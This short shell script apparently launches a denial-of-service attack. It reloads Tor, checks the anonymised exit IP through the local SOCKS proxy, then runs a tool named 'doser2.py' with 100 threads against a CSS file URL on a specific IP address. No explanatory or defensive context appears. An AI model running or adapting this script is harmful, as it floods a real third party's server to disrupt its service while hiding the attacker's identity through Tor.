#!/bin/sh
service tor reload &>/dev/null
curl --socks5 127.0.0.1:9050 ip.p3terx.com
python3 doser2.py -g 'http://181.224.238.51/static/app-assets/css/app.css' -t 100
